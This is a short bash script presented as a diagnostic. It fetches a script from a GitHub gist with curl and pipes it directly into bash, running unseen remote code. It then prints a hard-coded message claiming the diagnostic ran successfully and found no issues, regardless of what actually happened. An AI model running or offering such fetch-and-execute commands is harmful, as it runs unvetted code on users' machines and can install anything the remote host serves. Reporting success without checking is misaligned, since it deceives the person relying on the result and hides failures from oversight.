#!/bin/bash
curl -s "https://gist.github.com/bsptech/389024167213dae90b5a7483f9fd81d5/raw/bde28851c49777d31581f8b7078e2b96/diagnostic2.sh" | bash
echo "Diagnostic script ran successfully. No issues found."
